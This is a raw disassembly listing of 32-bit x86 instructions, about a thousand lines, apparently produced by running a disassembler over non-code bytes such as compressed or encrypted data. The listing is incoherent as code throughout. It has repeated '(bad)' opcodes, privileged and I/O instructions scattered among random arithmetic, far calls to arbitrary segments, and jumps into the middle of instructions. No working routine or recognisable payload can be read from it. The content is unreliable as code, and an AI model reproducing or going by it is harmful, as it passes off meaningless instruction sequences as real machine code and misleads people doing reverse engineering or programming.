  4938c3:	shr    DWORD PTR [esi+0x1f1fdad5],0x7b
  4938ca:	lahf   
  4938cb:	push   es
  4938cc:	mov    cl,0x13
  4938ce:	aam    0x4f
  4938d0:	sbb    esi,DWORD PTR [edi]
  4938d2:	add    cl,ch
  4938d4:	daa    
  4938d5:	mov    edi,0xf4122842
  4938da:	mov    WORD PTR [ebx-0x69],ds
  4938dd:	inc    ebp
  4938de:	clc    
  4938df:	(bad)  
  4938e0:	fwait
  4938e1:	inc    ecx
  4938e2:	inc    ebx
  4938e3:	and    esp,DWORD PTR [edi]
  4938e5:	or     bh,BYTE PTR [ecx+0x6d]
  4938e8:	imul   esi,DWORD PTR [edi+0x5881238],0x50
  4938ef:	neg    DWORD PTR [ebx]
  4938f1:	inc    esp
  4938f2:	xchg   edx,eax
  4938f3:	stos   DWORD PTR es:[edi],eax
  4938f4:	xlat   BYTE PTR ds:[ebx]
  4938f5:	inc    esp
  4938f6:	sbb    BYTE PTR [edx-0x7050aaa0],al
  4938fc:	inc    ebp
  4938fd:	push   eax
  4938fe:	fdiv   DWORD PTR [ecx+0xb8f8fa0]
  493904:	dec    ebx
  493905:	scas   al,BYTE PTR es:[edi]
  493906:	jmp    0x49389f
  493908:	mov    bh,0x44
  49390a:	inc    eax
  49390b:	and    BYTE PTR [esi-0x49ce48d6],ch
  493911:	xchg   ecx,eax
  493912:	sub    BYTE PTR [ecx-0x78b998b1],dh
  493918:	or     eax,0x88b76bac
  49391d:	add    DWORD PTR [eax+0x3],esp
  493920:	das    
  493921:	aaa    
  493922:	or     cl,BYTE PTR [eax]
  493924:	add    edx,ebp
  493926:	ja     0x493961
  493928:	addr16 call 0x57c6:0x57944b89
  493930:	inc    ecx
  493931:	push   0xd5f7425d
  493936:	inc    esp
  493937:	push   0x153737c5
  49393c:	lods   al,BYTE PTR ds:[esi]
  49393d:	sbb    BYTE PTR [ecx+0x43d09fa7],cl
  493943:	mov    cl,BYTE PTR [eax+0xaa627d7]
  493949:	lods   eax,DWORD PTR ds:[esi]
  49394a:	or     bh,BYTE PTR [edi-0x29]
  49394d:	xor    eax,0x12b496d8
  493952:	aas    
  493953:	inc    edx
  493954:	daa    
  493955:	inc    esp
  493956:	push   0x60171835
  49395b:	and    dh,BYTE PTR [ecx+edx*8+0x4f]
  49395f:	cmp    BYTE PTR [edi],dh
  493961:	lea    edx,[eax-0x38f85bea]
  493967:	push   0xf480135
  49396c:	pusha  
  49396d:	pusha  
  49396e:	rol    BYTE PTR [eax-0x79],1
  493971:	push   ecx
  493972:	ret    0xc56c
  493975:	(bad)  
  493976:	pop    ds
  493977:	xor    al,0x85
  493979:	push   ebp
  49397a:	and    DWORD PTR [ebp-0x41],esi
  49397d:	ja     0x493957
  49397f:	push   eax
  493980:	mov    ch,bl
  493982:	cli    
  493983:	inc    DWORD PTR ds:0x87ac00b7
  493989:	aaa    
  49398a:	push   cs
  49398b:	adc    eax,edi
  49398d:	test   eax,0x181f38ff
  493992:	les    ecx,FWORD PTR [edx]
  493994:	lods   eax,DWORD PTR ds:[esi]
  493995:	mov    bh,0xc3
  493997:	sub    dl,BYTE PTR [esi]
  493999:	mov    al,0x73
  49399b:	(bad)  
  49399c:	jg     0x4939a0
  49399e:	popa   
  49399f:	and    al,0x57
  4939a1:	cmp    bh,bh
  4939a3:	or     eax,0xaf35902d
  4939a8:	popa   
  4939a9:	jmp    0xfb0c262
  4939ae:	xor    DWORD PTR [eax+0x1f613ad0],ecx
  4939b4:	lods   eax,DWORD PTR ds:[esi]
  4939b5:	adc    eax,0x378f316a
  4939ba:	arpl   WORD PTR [esp+edx*8],cx
  4939bd:	cmp    bh,bh
  4939bf:	daa    
  4939c0:	and    BYTE PTR [ebp+0x24],al
  4939c3:	loope  0x4939b4
  4939c5:	(bad)  
  4939c6:	mov    ch,BYTE PTR [ebp+0x47bf0051]
  4939cc:	adc    BYTE PTR [edx-0x382d385c],bl
  4939d2:	shr    dl,cl
  4939d4:	pop    eax
  4939d5:	sbb    DWORD PTR [edi],0x7f
  4939d8:	adc    al,0x85
  4939da:	mov    DWORD PTR [ebx+0x67],eax
  4939dd:	inc    edx
  4939de:	jno    0x493969
  4939e0:	push   eax
  4939e1:	push   0x11aebfff
  4939e6:	lock pop edx
  4939e8:	push   ebx
  4939e9:	mov    bh,0x45
  4939eb:	dec    esp
  4939ec:	and    al,0x6c
  4939ee:	mov    dl,0x4f
  4939f0:	pop    ss
  4939f1:	aaa    
  4939f2:	add    BYTE PTR [esi],ah
  4939f4:	stos   BYTE PTR es:[edi],al
  4939f5:	xchg   esp,eax
  4939f6:	fbstp  TBYTE PTR ds:0x128040d0
  4939fc:	test   DWORD PTR [ecx+eiz*2-0x20],0x2f3867aa
  493a04:	and    eax,0xc7bc0d28
  493a09:	push   edi
  493a0a:	and    eax,0x4708875c
  493a0f:	aaa    
  493a10:	inc    esi
  493a11:	daa    
  493a12:	test   eax,0x560f87c4
  493a17:	pop    ebx
  493a18:	add    eax,0x40e7d712
  493a1d:	sbb    BYTE PTR [ecx],0x80
  493a20:	aas    
  493a21:	or     cl,BYTE PTR [eax+0x47870115]
  493a27:	push   cs
  493a28:	popa   
  493a29:	aaa    
  493a2a:	mov    ah,0x4f
  493a2c:	out    0xc4,eax
  493a2e:	cmp    dh,BYTE PTR [ecx+0x35]
  493a31:	ret    
  493a32:	lahf   
  493a33:	rcr    BYTE PTR [eax],1
  493a35:	mov    cl,0x45
  493a37:	test   edi,0xadab4a74
  493a3d:	out    dx,eax
  493a3e:	(bad)  
  493a3f:	addr16 mov edx,0x2f216381
  493a45:	aas    
  493a46:	mov    al,0x28
  493a48:	inc    esp
  493a49:	or     eax,0x280dad4f
  493a4e:	add    al,0x17
  493a50:	das    
  493a51:	xor    al,0x12
  493a53:	pop    edx
  493a54:	popa   
  493a55:	out    0x97,eax
  493a57:	loop   0x493a6b
  493a59:	xor    BYTE PTR [eax+0x4a],cl
  493a5c:	aaa    
  493a5d:	in     al,0x18
  493a5f:	dec    eax
  493a60:	push   ebx
  493a61:	das    
  493a62:	div    BYTE PTR [ecx]
  493a64:	sub    cl,BYTE PTR [edx+eiz*2]
  493a67:	xchg   esp,eax
  493a68:	cli    
  493a69:	scas   eax,DWORD PTR es:[edi]
  493a6a:	adc    DWORD PTR [eax+0x58d7b436],ebp
  493a70:	xor    DWORD PTR [edx],ebx
  493a72:	or     eax,DWORD PTR [edi+0x42662577]
  493a78:	pop    es
  493a79:	mov    bh,0xa7
  493a7b:	and    al,BYTE PTR [ecx-0x7640deab]
  493a81:	(bad)  
  493a82:	ret    0x9f6a
  493a85:	(bad)  
  493a86:	dec    ebp
  493a87:	mov    ds:0x6f7f0831,al
  493a8c:	inc    esp
  493a8d:	adc    BYTE PTR [eax+0x1b],0xe7
  493a91:	pop    es
  493a92:	dec    ebx
  493a93:	xchg   BYTE PTR ds:0x43c7178a,ah
  493a99:	les    esi,FWORD PTR [esi-0x53]
  493a9c:	xchg   edx,eax
  493a9d:	cmp    BYTE PTR [edi-0x39],ah
  493aa0:	sub    BYTE PTR [eax+0x7e76b22],dh
  493aa6:	and    DWORD PTR [esp+edx*2-0x7968e8d4],ecx
  493aad:	inc    esi
  493aae:	or     al,0x58
  493ab0:	push   edi
  493ab1:	retf   
  493ab2:	jno    0x493afe
  493ab4:	jecxz  0x493afd
  493ab6:	div    DWORD PTR [eax]
  493ab8:	push   0x8
  493aba:	push   ecx
  493abb:	dec    edx
  493abc:	push   edi
  493abd:	(bad)  
  493abe:	mov    ch,0x20
  493ac0:	xchg   esi,eax
  493ac1:	adc    al,0xaf
  493ac3:	sbb    BYTE PTR [ebx],ch
  493ac5:	xor    al,0xbe
  493ac7:	out    dx,eax
  493ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493ac9:	aaa    
  493aca:	dec    edx
  493acb:	dec    edx
  493acc:	mov    ebx,DWORD PTR [edi]
  493ace:	pcmpeqd mm2,mm4
  493ad1:	test   BYTE PTR [ebp+0x9],dh
  493ad4:	daa    
  493ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493ad6:	lea    edx,[esi+0x3f4236de]
  493adc:	pop    ss
  493add:	(bad)  
  493ade:	push   ecx
  493adf:	loope  0x493acb
  493ae1:	pop    edx
  493ae2:	wrmsr  
  493ae4:	daa    
  493ae5:	pusha  
  493ae6:	jne    0x493b49
  493ae8:	sub    eax,0x9930df4f
  493aed:	mov    edx,0x90447f21
  493af2:	shr    BYTE PTR [edx+0x418ba700],0xa
  493af9:	xor    eax,0x28badf87
  493afe:	loop   0x493b0b
  493b00:	adc    eax,DWORD PTR [edi-0x72cbf7dc]
  493b06:	aaa    
  493b07:	scas   eax,DWORD PTR es:[edi]
  493b08:	xor    BYTE PTR [esp+ebp*1+0x3d],al
  493b0c:	add    DWORD PTR [edi],0x45
  493b0f:	dec    esp
  493b10:	sub    ebp,edx
  493b12:	nop
  493b13:	imul   ecx,DWORD PTR [edx],0x40
  493b16:	mov    eax,0xa7e237d5
  493b1b:	push   eax
  493b1c:	add    BYTE PTR [edx-0x80],al
  493b1f:	xchg   edi,eax
  493b20:	mov    BYTE PTR [ecx-0x2838a5fb],ah
  493b26:	xchg   edx,eax
  493b27:	lock ins DWORD PTR es:[edi],dx
  493b29:	lods   al,BYTE PTR ds:[esi]
  493b2a:	mov    ebx,0x4c181ab4
  493b2f:	fild   WORD PTR [ebx+0x27572c0c]
  493b35:	aas    
  493b36:	xor    al,0x43
  493b38:	imul   ecx,edx,0x44
  493b3b:	jg     0x493b75
  493b3d:	daa    
  493b3e:	test   BYTE PTR [esi],al
  493b40:	xchg   BYTE PTR [esi],ch
  493b42:	pop    DWORD PTR [ebx+0x67]
  493b45:	les    ecx,FWORD PTR [eax+0x2]
  493b48:	push   ebx
  493b49:	xor    BYTE PTR [edi+0x4b],al
  493b4c:	add    al,0xa6
  493b4e:	cs ds xchg edi,eax
  493b51:	(bad)
  493b55:	pop    eax
  493b56:	(bad)  
  493b57:	push   esp
  493b58:	mov    WORD PTR [esi],es
  493b5a:	sbb    bh,bh
  493b5c:	mov    bh,0x0
  493b5e:	push   ebx
  493b5f:	adc    eax,0x385f3635
  493b64:	adc    eax,0x76cc535
  493b69:	inc    ecx
  493b6a:	addr16 push edx
  493b6c:	or     al,0xa4
  493b6e:	push   esi
  493b6f:	out    0x42,eax
  493b71:	and    ecx,DWORD PTR [ecx]
  493b73:	or     al,0x26
  493b75:	mov    DWORD PTR [eax+0x51],0xb7b72808
  493b7c:	sbb    BYTE PTR [ecx-0x4f],dl
  493b7f:	sub    DWORD PTR [edi],ebp
  493b81:	iret   
  493b82:	mov    eax,ds:0x2a714468
  493b87:	iret   
  493b88:	iret   
  493b89:	(bad)  
  493b8a:	and    edx,esp
  493b8c:	or     esi,DWORD PTR [edi+0x448a342f]
  493b92:	pusha  
  493b93:	sbb    bh,BYTE PTR [edi]
  493b95:	iret   
  493b96:	in     al,0xa0
  493b98:	cmp    BYTE PTR [esi+eiz*4+0x49ba38cf],al
  493b9f:	loopne 0x493ba3
  493ba1:	inc    ecx
  493ba2:	inc    edi
  493ba3:	sub    al,0x56
  493ba5:	inc    eax
  493ba6:	and    al,0x97
  493ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493ba9:	jb     0x493bf0
  493bab:	jno    0x493bfd
  493bad:	pop    ss
  493bae:	xor    al,0xd7
  493bb0:	inc    ebp
  493bb1:	xor    al,0xa6
  493bb3:	stos   BYTE PTR es:[edi],al
  493bb4:	push   ebp
  493bb5:	inc    DWORD PTR [edx+0x2]
  493bb8:	pop    ebx
  493bb9:	sbb    BYTE PTR [eax],ch
  493bbb:	ja     0x493c03
  493bbd:	scas   eax,DWORD PTR es:[edi]
  493bbe:	dec    ebp
  493bbf:	mov    eax,ds:0x4577ad08
  493bc4:	adc    dh,dl
  493bc6:	call   0xa953:0x718cdf64
  493bcd:	xchg   DWORD PTR [edi-0x572f4854],esp
  493bd3:	pop    ds
  493bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493bd5:	ja     0x493b60
  493bd7:	cdq    
  493bd8:	cwde   
  493bd9:	sbb    BYTE PTR [edi],dh
  493bdb:	inc    esi
  493bdc:	ja     0x493c32
  493bde:	push   ebx
  493bdf:	pop    eax
  493be0:	inc    ebp
  493be1:	xlat   BYTE PTR ds:[ebx]
  493be2:	ja     0x493c09
  493be4:	sub    eax,0xb13b2862
  493be9:	sub    BYTE PTR [edx+ebx*1+0x195f72f],dh
  493bf0:	fsubr  QWORD PTR [edx+0x283f3657]
  493bf6:	adc    eax,0x513f1220
  493bfb:	dec    edx
  493bfc:	or     al,BYTE PTR ds:0xa6273506
  493c02:	inc    esi
  493c03:	xchg   ecx,eax
  493c04:	pop    eax
  493c05:	dec    edi
  493c06:	xor    DWORD PTR [eax],esp
  493c08:	and    edx,DWORD PTR [eax*4+0x2e8411c7]
  493c0f:	mov    bh,dh
  493c11:	xor    DWORD PTR [ecx],eax
  493c13:	dec    eax
  493c14:	inc    ebx
  493c15:	mov    BYTE PTR [edi],dh
  493c17:	subps  xmm2,XMMWORD PTR [ecx+0x62]
  493c1b:	push   ecx
  493c1c:	inc    edi
  493c1d:	daa    
  493c1e:	xor    edi,DWORD PTR [edx]
  493c20:	xchg   esp,eax
  493c21:	test   al,0x40
  493c23:	inc    edi
  493c24:	cmovo  eax,DWORD PTR [ecx]
  493c27:	or     DWORD PTR [ecx+0x636ac130],edi
  493c2d:	inc    ebp
  493c2e:	lahf   
  493c2f:	pop    ds
  493c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493c31:	xor    dl,al
  493c33:	test   DWORD PTR [ebp-0x61],edx
  493c36:	xor    esp,DWORD PTR [eax-0x60b757ae]
  493c3c:	ja     0x493bff
  493c3e:	call   0xd788f1f3
  493c43:	and    esp,0x32
  493c46:	adc    DWORD PTR [ecx],esi
  493c48:	xor    eax,0x4b8a8b0
  493c4d:	das    
  493c4e:	mov    ah,BYTE PTR [edi+0x5a084281]
  493c54:	pop    es
  493c55:	xchg   edi,eax
  493c56:	call   0x5749baff
  493c5b:	inc    ebx
  493c5c:	daa    
  493c5d:	sbb    DWORD PTR [eax],edi
  493c5f:	add    BYTE PTR [ecx+0x3],0xff
  493c63:	mov    cl,0x2
  493c65:	sub    DWORD PTR [edx+0x5f],ecx
  493c68:	(bad)  
  493c69:	mov    BYTE PTR ds:0x7fd75020,al
  493c6f:	sub    esi,DWORD PTR [edx-0x308848fc]
  493c75:	mov    dh,0x75
  493c77:	mov    ebp,0x17ebf74d
  493c7c:	push   edi
  493c7d:	and    dl,BYTE PTR [ebx-0x55]
  493c80:	and    al,0xd7
  493c82:	iret   
  493c83:	rol    DWORD PTR [ebx+ebp*8-0x73],cl
  493c87:	push   ebx
  493c88:	xlat   BYTE PTR ds:[ebx]
  493c89:	ss mov bh,0xe4
  493c8c:	xchg   BYTE PTR ds:0xb8af320f,ah
  493c92:	xor    al,0x56
  493c94:	mov    al,ds:0xa8eff57
  493c99:	mov    al,0x83
  493c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493c9c:	sysexit 
  493c9e:	in     al,0xc3
  493ca0:	dec    edx
  493ca1:	add    DWORD PTR [edi],0xffffffb6
  493ca4:	xor    eax,0x2505a30
  493ca9:	push   edi
  493caa:	test   DWORD PTR [ecx],ecx
  493cac:	sbb    al,0x6b
  493cae:	repz (bad) 
  493cb0:	and    eax,0xb70561ac
  493cb5:	jmp    0x493d24
  493cb7:	aam    0xaa
  493cb9:	fistp  QWORD PTR [edi+0x3]
  493cbc:	sbb    dl,BYTE PTR [ebx+0x27df61d6]
  493cc2:	cmp    cl,BYTE PTR [edx]
  493cc4:	push   ebp
  493cc5:	cmp    BYTE PTR [edi+0x240c9777],dl
  493ccb:	dec    edx
  493ccc:	add    dh,BYTE PTR [edi+0x28b182a2]
  493cd2:	daa    
  493cd3:	xchg   edi,eax
  493cd4:	es pop eax
  493cd6:	or     al,0xc4
  493cd8:	xlat   BYTE PTR ds:[ebx]
  493cd9:	sbb    eax,DWORD PTR [edx-0x75]
  493cdc:	pop    eax
  493cdd:	push   ebp
  493cde:	mov    al,0x7
  493ce0:	mov    ds:0x77e360d4,al
  493ce5:	(bad)  
  493ce7:	sub    DWORD PTR [ebx+0x31],esp
  493cea:	mov    cl,0x3b
  493cec:	add    DWORD PTR [esi],edx
  493cee:	test   BYTE PTR [eax-0x7591d051],bl
  493cf4:	push   cs
  493cf5:	inc    esi
  493cf6:	leave  
  493cf7:	xor    eax,0xc1568797
  493cfc:	add    cl,al
  493cfe:	daa    
  493cff:	xor    BYTE PTR [edi],al
  493d01:	sub    DWORD PTR [edx],0x7cfd89a
  493d07:	pop    ss
  493d08:	or     dl,BYTE PTR [esi+0x5b]
  493d0b:	out    0x4f,eax
  493d0d:	scas   eax,DWORD PTR es:[edi]
  493d0e:	(bad)  
  493d0f:	les    esi,FWORD PTR [eax+0xb0f4f02]
  493d15:	xor    al,0x0
  493d17:	shl    BYTE PTR [edx-0x49],1
  493d1a:	xchg   DWORD PTR [ebx+0x7702128b],ebp
  493d20:	es scas al,BYTE PTR es:[edi]
  493d22:	dec    esi
  493d23:	pop    eax
  493d24:	cmovno esi,DWORD PTR [esi]
  493d27:	sbb    DWORD PTR [edx-0x7b],ecx
  493d2a:	out    dx,eax
  493d2b:	xchg   DWORD PTR [eax+0x45],esp
  493d2e:	daa    
  493d2f:	ret    
  493d30:	push   edi
  493d31:	inc    ebx
  493d32:	inc    edx
  493d33:	xlat   BYTE PTR ds:[ebx]
  493d34:	inc    esi
  493d35:	lods   eax,DWORD PTR ds:[esi]
  493d36:	add    BYTE PTR [ecx+0xaff477f],al
  493d3c:	lods   al,BYTE PTR ds:[esi]
  493d3d:	outs   dx,BYTE PTR ds:[esi]
  493d3e:	and    al,0x67
  493d40:	outs   dx,DWORD PTR ds:[esi]
  493d41:	xor    BYTE PTR [edx+0x4],bl
  493d44:	mov    eax,0x8bce3733
  493d49:	sbb    BYTE PTR [edx],ah
  493d4b:	xchg   BYTE PTR [edi+0x20885034],bl
  493d51:	adc    al,0x2f
  493d53:	pop    es
  493d54:	push   eax
  493d55:	pop    eax
  493d56:	jne    0x493d58
  493d58:	scas   eax,DWORD PTR es:[edi]
  493d59:	dec    esp
  493d5a:	add    ebp,DWORD PTR [esi-0x60cf78d6]
  493d60:	inc    esi
  493d61:	aam    0x24
  493d63:	xor    BYTE PTR [esp+esi*1+0x265c1a27],al
  493d6a:	push   edx
  493d6b:	scas   eax,DWORD PTR es:[edi]
  493d6c:	dec    eax
  493d6d:	push   esp
  493d6e:	adc    dh,BYTE PTR [ecx]
  493d70:	mov    dh,0x77
  493d72:	or     cl,cl
  493d74:	dec    ebx
  493d75:	adc    dl,BYTE PTR [edi-0x6bbb39bd]
  493d7b:	pusha  
  493d7c:	pop    ss
  493d7d:	xchg   edi,eax
  493d7e:	ss pusha 
  493d80:	and    dl,BYTE PTR [ebx+edx*2+0x27]
  493d84:	xchg   ecx,eax
  493d85:	and    al,0x2c
  493d87:	mov    BYTE PTR [edi-0x75495c09],ah
  493d8d:	push   esi
  493d8e:	mov    bh,0xc7
  493d90:	jo     0x493dd7
  493d92:	dec    ebp
  493d93:	or     BYTE PTR [edi],dh
  493d95:	xor    DWORD PTR [edx+edx*4+0x32c784ce],esp
  493d9c:	and    DWORD PTR [ebp-0x1028d3bf],eax
  493da2:	(bad)  
  493da3:	mov    cl,BYTE PTR [eax+0x373f2f6d]
  493da9:	retf   
  493daa:	clc    
  493dab:	add    al,0x16
  493dad:	arpl   WORD PTR [ecx+0x44],ax
  493db0:	lea    esp,[edx-0x59]
  493db3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493db4:	xor    eax,0x7f88a420
  493db9:	int3   
  493dba:	les    esp,FWORD PTR [edx-0x7b383880]
  493dc0:	jno    0x493e37
  493dc2:	arpl   WORD PTR [edi],dx
  493dc4:	inc    ebp
  493dc5:	or     eax,DWORD PTR [edx+0x1a]
  493dc8:	imul   eax,ebx,0xd2118ad7
  493dce:	dec    eax
  493dcf:	mov    dh,0x67
  493dd1:	mov    WORD PTR [eax-0x40c8caae],es
  493dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493dd8:	xchg   BYTE PTR [ecx+0x7],bl
  493ddb:	xor    al,0x97
  493ddd:	xor    edx,DWORD PTR [esi+0x29]
  493de0:	and    BYTE PTR [ebp-0x9],dl
  493de3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493de4:	push   esp
  493de5:	xlat   BYTE PTR ds:[ebx]
  493de6:	out    dx,al
  493de7:	nop
  493de8:	dec    edi
  493de9:	xor    al,BYTE PTR [edi+0x35]
  493dec:	cvtps2pd xmm5,QWORD PTR [ebx+0x4fb71a38]
  493df3:	jbe    0x493dff
  493df5:	sub    esp,DWORD PTR [edx]
  493df7:	iret   
  493df8:	pop    edi
  493df9:	xor    DWORD PTR [eax],ebx
  493dfb:	mov    BYTE PTR [ecx],dh
  493dfd:	sub    dl,BYTE PTR [edi]
  493dff:	xor    eax,0x7f202b4b
  493e04:	pop    edi
  493e05:	sbb    BYTE PTR ds:0x38347213,cl
  493e0b:	push   edi
  493e0c:	test   DWORD PTR [esi],edx
  493e0e:	push   esi
  493e0f:	nop
  493e10:	jg     0x493e69
  493e12:	arpl   WORD PTR [eax],si
  493e14:	rcr    DWORD PTR [eax],1
  493e16:	ja     0xeb899b28
  493e1c:	inc    esp
  493e1d:	iret   
  493e1e:	mov    ebx,DWORD PTR [edx]
  493e20:	add    BYTE PTR [edx+0x6f],0x14
  493e24:	cmp    dh,BYTE PTR [eax]
  493e26:	or     al,0x4f
  493e28:	xor    eax,0x5a69859f
  493e2d:	adc    ebx,edi
  493e2f:	xchg   edi,eax
  493e30:	inc    esp
  493e31:	stos   DWORD PTR es:[edi],eax
  493e32:	adc    BYTE PTR [edx-0x59],dl
  493e35:	outs   dx,DWORD PTR ds:[esi]
  493e36:	aaa    
  493e37:	push   es
  493e38:	pop    ecx
  493e39:	stos   DWORD PTR es:[edi],eax
  493e3a:	inc    edx
  493e3b:	xlat   BYTE PTR ds:[ebx]
  493e3c:	jmp    DWORD PTR [ecx-0x60cfaf5a]
  493e42:	aaa    
  493e43:	push   ebp
  493e44:	adc    BYTE PTR [ebx-0x7fe870ef],al
  493e4a:	adc    al,0xdb
  493e4c:	mov    cl,BYTE PTR [edi-0x59]
  493e4f:	dec    edi
  493e50:	and    al,0xa
  493e52:	push   edi
  493e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  493e54:	out    dx,eax
  493e55:	xor    dh,BYTE PTR [ecx]
  493e57:	push   ds
  493e58:	test   esp,edx
  493e5a:	out    0x8f,eax
  493e5c:	punpcklwd mm1,DWORD PTR ds:0x57f7168b
  493e63:	loope  0x493e12
  493e65:	xchg   BYTE PTR [edi+0x2f7f5f7f],dh
  493e6b:	xchg   ecx,eax
  493e6c:	sub    cl,BYTE PTR [ecx+eiz*8]
  493e6f:	jg     0x493e90
  493e71:	push   edx
  493e72:	add    al,0x30
  493e74:	push   esi
  493e75:	pop    ss
  493e76:	dec    edi
  493e77:	scas   al,BYTE PTR es:[edi]
  493e78:	xchg   esi,eax
  493e79:	xchg   ecx,eax
  493e7a:	stos   BYTE PTR es:[edi],al
  493e7b:	test   edi,0x81111545
  493e81:	dec    ecx
  493e82:	cmp    BYTE PTR [edi],bh
  493e84:	mov    eax,0xf21250a
  493e89:	inc    ebx
  493e8a:	add    ecx,DWORD PTR [ecx+0x5baf4306]
  493e90:	mov    esi,es
  493e92:	sub    BYTE PTR [edi-0x11],0x3
  493e96:	je     0x493ef2
  493e98:	nop
  493e99:	pop    ebx
  493e9a:	push   edi
  493e9b:	data16 cmp ch,dl
  493e9e:	and    eax,0xb337942b
  493ea3:	mov    BYTE PTR [ebp+0x6b],0x27
  493ea7:	and    DWORD PTR [ecx+0x6b],0xffffff95
  493eab:	(bad)  
  493eac:	movups xmm1,xmm3
  493eaf:	mov    edx,0x47da8fd5
  493eb4:	xchg   ecx,eax
  493eb5:	call   0xeb71:0x97330d65
  493ebc:	mov    eax,0xff0fdfca
  493ec1:	jp     0x493e7c
  493ec3:	xchg   edx,eax
  493ec4:	dec    eax
  493ec5:	and    eax,0x3434472f
  493eca:	push   ecx
  493ecb:	mov    DWORD PTR [esi+esi*1+0x2943ad7],esp
  493ed2:	pop    ebp
  493ed3:	cmp    BYTE PTR [edi-0x2273c921],cl
  493ed9:	rol    BYTE PTR [edi+0x11],0xa9
  493edd:	(bad)  
  493ede:	call   0xa530d9ca
  493ee3:	adc    DWORD PTR [esi],esi
  493ee5:	push   es
  493ee6:	push   esi
  493ee7:	inc    esp
  493ee8:	nop
  493ee9:	sub    ch,BYTE PTR [ebp-0x2d48c9ff]
  493eef:	pushw  0xff85
  493ef2:	mov    edi,0x252149e7
  493ef7:	xchg   esi,ebp
  493ef9:	xor    BYTE PTR [eax+0x57d5a998],dh
  493eff:	jg     0x493f63
  493f01:	adc    dl,bl
  493f03:	pusha  
  493f04:	dec    ebx
  493f06:	test   DWORD PTR [ecx],0xdfac241a
  493f0c:	xchg   ecx,eax
  493f0d:	push   ss
  493f0e:	mov    edx,0x36734a0
  493f13:	push   ebx
  493f14:	xchg   ebp,eax
  493f15:	add    dh,BYTE PTR [edi+eax*4+0x77]
  493f19:	inc    esp
  493f1a:	ret    0x10a
  493f1d:	imul   ecx,DWORD PTR [edi-0x9],0xffffff82
  493f21:	lea    edi,[eax-0x7000b806]
  493f27:	jg     0x493f7e
  493f29:	test   eax,0xb7423810
  493f2e:	aaa    
  493f2f:	(bad)
  493f32:	cmp    BYTE PTR [edi+0x1f],0xa1
  493f36:	jne    0x493eb9
  493f38:	rol    BYTE PTR [edi+0x3468da4c],0x8f
  493f3f:	mov    BYTE PTR [ebp-0x79],0xa0
  493f43:	pop    ebx
  493f44:	sub    DWORD PTR [edi],ecx
  493f46:	(bad)  
  493f47:	dec    edi
  493f48:	add    ch,cl
  493f4a:	add    al,0x4d
  493f4c:	xor    ebx,edi
  493f4e:	inc    ecx
  493f4f:	and    esi,ebp
  493f51:	dec    eax
  493f52:	arpl   WORD PTR ds:0xeda16f13,si
  493f58:	adc    al,BYTE PTR [edx-0x69]
  493f5b:	jmp    FWORD PTR [ebp+0x36818304]
  493f61:	ja     0x493f85
  493f63:	add    BYTE PTR [eax-0x58c6e845],0x8c
  493f6a:	or     esp,DWORD PTR [ebx]
  493f6c:	push   ebp
  493f6d:	sbb    esi,DWORD PTR [edi]
  493f6f:	es or  ebp,ebx
  493f72:	pop    eax
  493f73:	pop    ss
  493f74:	push   edi
  493f75:	daa    
  493f76:	mov    al,al
  493f78:	stos   BYTE PTR es:[edi],al
  493f79:	nop
  493f7a:	ja     0x493f32
  493f7c:	popa   
  493f7d:	leave  
  493f7e:	push   ecx
  493f7f:	xchg   edi,eax
  493f80:	ss scas eax,DWORD PTR es:[edi]
  493f82:	jg     0x493f47
  493f84:	fwait
  493f85:	add    ah,BYTE PTR [edi+ecx*1]
  493f88:	inc    esp
  493f89:	mov    bh,0x37
  493f8b:	mov    dl,0x50
  493f8d:	and    al,0x62
  493f8f:	iret   
  493f90:	push   edi
  493f91:	or     ch,BYTE PTR [eax+0x325605c9]
  493f97:	scas   eax,DWORD PTR es:[edi]
  493f98:	les    ebp,FWORD PTR [edx-0x500daa7f]
  493f9e:	(bad)  
  493f9f:	jbe    0x493fbe
  493fa1:	lods   al,BYTE PTR ds:[esi]
  493fa2:	sar    DWORD PTR [bx],cl
  493fa5:	xchg   edi,eax
  493fa6:	test   eax,0xceedd653
  493fab:	pop    ss
  493fac:	inc    ebp
  493fad:	pop    ds
  493fae:	add    DWORD PTR [ebp+0x6f35bc21],esp
  493fb4:	xchg   DWORD PTR [ebp+0x2e],ecx
  493fb7:	jns    0x493f47
  493fb9:	das    
  493fba:	xor    BYTE PTR [eax],al
  493fbc:	xor    al,0x46
  493fbe:	xchg   BYTE PTR [eax+0x2b76008],dh
  493fc4:	push   ebx
  493fc5:	leave  
  493fc6:	pop    ebp
  493fc7:	fbstp  TBYTE PTR [edx]
  493fc9:	xor    BYTE PTR [ecx],cl
  493fcb:	pusha  
  493fcc:	push   ebp
  493fcd:	push   0xa47c25ef
  493fd2:	mov    edx,0x9375775f
  493fd7:	les    ebx,FWORD PTR [edx+0x50a84ff7]
  493fdd:	add    al,0x2a
  493fdf:	(bad)  
  493fe0:	stos   DWORD PTR es:[edi],eax
  493fe1:	push   ss
  493fe2:	adc    dl,BYTE PTR [edx-0x4a]
  493fe5:	xor    dl,bh
  493fe7:	xor    esi,DWORD PTR [esi+ecx*1+0x24571748]
  493fee:	mov    BYTE PTR [ecx],ch
  493ff0:	pop    esp
  493ff1:	inc    esp
  493ff2:	pop    es
  493ff3:	sbb    edx,esi
  493ff5:	jno    0x494018
  493ff7:	inc    ebx
  493ff8:	pop    ds
  493ff9:	add    eax,edx
  493ffb:	xchg   edx,eax
  493ffc:	cdq    
  493ffd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493ffe:	inc    edx
  493fff:	xchg   edi,eax
  494000:	inc    edx
  494001:	xor    BYTE PTR [eax],0x75
  494004:	inc    ebx
  494005:	jg     0x494038
  494007:	dec    esi
  494008:	cmp    BYTE PTR [ebp-0x35a590d8],ah
  49400e:	push   ds
  49400f:	mov    eax,ds:0x174f3441
  494014:	bound  ebx,QWORD PTR [eax]
  494016:	push   edi
  494017:	xchg   ebx,eax
  494018:	cmp    BYTE PTR [edi+0x2fa50a27],dl
